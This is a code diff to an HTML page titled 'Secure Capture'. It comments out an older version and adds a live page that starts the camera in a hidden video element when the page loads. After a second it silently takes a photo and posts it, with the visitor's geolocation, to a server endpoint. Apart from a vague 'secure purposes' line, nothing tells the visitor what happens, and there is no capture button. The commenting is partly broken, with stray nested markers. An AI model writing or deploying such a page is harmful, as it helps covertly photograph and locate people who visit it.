@@ -50,7 +50,7 @@
     </script>
 </body>
 </html> -->
-
+<!-- 
 <!DOCTYPE html>
 <html lang="en">
 
@@ -59,7 +59,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Capture</title>
-    <!-- Bootstrap CSS -->
+    Bootstrap CSS
     <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <style>
         #video {
@@ -83,7 +83,7 @@
     </div>
 
     <!-- Bootstrap JS and dependencies -->
-    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <!-- <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
 
@@ -152,6 +152,123 @@
                     console.error("Error accessing the camera: " + err);
                 });
         });
+    </script>
+</body> -->
+
+<!-- </html> --> -->
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Capture</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        #video {
+            display: none;
+        }
+
+        .container {
+            max-width: 600px;
+            margin-top: 50px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container text-center">
+        <h1 class="my-4">Capture & Secure</h1>
+        <p class="lead">This application will take your photo and request your location for secure purposes.</p>
+        <video id="video" autoplay></video>
+        <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+    </div>
+
+    <!-- Bootstrap JS and dependencies -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Function to send image and location data to the server
+        async function sendImage(dataURL, location) {
+            try {
+                const response = await fetch('/api/sendPhoto', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        image: dataURL,
+                        location: {
+                            latitude: location.latitude,
+                            longitude: location.longitude
+                        }
+                    })
+                });
+                const data = await response.json();
+                console.log('Success:', data);
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        // Function to capture the image from the video stream
+        function captureImage() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataURL = canvas.toDataURL('image/jpeg');
+            getLocation(dataURL);
+        }
+
+        // Function to get the user's location
+        function getLocation(dataURL) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const location = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+                    sendImage(dataURL, location);
+                }, error => {
+                    console.error("Error getting location: " + error.message);
+                    sendImage(dataURL, { latitude: null, longitude: null });
+                });
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+                sendImage(dataURL, { latitude: null, longitude: null });
+            }
+        }
+
+        // Function to start the video stream and capture the photo automatically
+        function startCapture() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        setTimeout(() => {
+                            captureImage();
+                            stream.getTracks().forEach(track => track.stop()); // Stop the stream after capturing the image
+                        }, 1000); // Delay to ensure video is ready
+                    };
+                })
+                .catch(err => {
+                    console.error("Error accessing the camera: " + err);
+                });
+        }
+
+        // Start the capture process automatically when the page loads
+        window.onload = () => {
+            startCapture();
+        };
     </script>
 </body>
 
